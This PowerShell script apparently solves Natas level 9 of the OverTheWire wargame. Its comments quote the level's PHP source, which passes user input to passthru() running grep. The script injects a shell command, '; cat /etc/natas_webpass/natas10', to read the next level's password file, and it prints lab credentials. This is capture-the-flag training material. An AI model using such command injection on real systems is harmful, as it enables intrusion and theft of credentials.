
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas9.natas.labs.overthewire.org"
$creds = "natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
# req $a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# res  <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# Output:
# <pre>
# </pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------
# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean

# Output:
# <pre>
# <?
# $key = "";

# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }

# if($key != "") {
#     passthru("grep -i $key dictionary.txt");
# }
# ?>
# </pre>
# --------------------------------------------------------------------------------

$parms = @{"needle" = "b3twiise ;  cat /etc/natas_webpass/natas10"; "submit" = ""}
$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms -proxy "http://localhost:8080" -Headers $headers).content 


$passwd = ($a | select-string -AllMatches "(\w{20,})").matches[1]


echo "The password for natas10 is $passwd"


<#PS /home/voltron/OTW/natas/pshell_lang>  
./natas10.ps1                                                                                        
The password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu                                                                                  
PS /home/voltron/OTW/natas/pshell_lang> 
#>
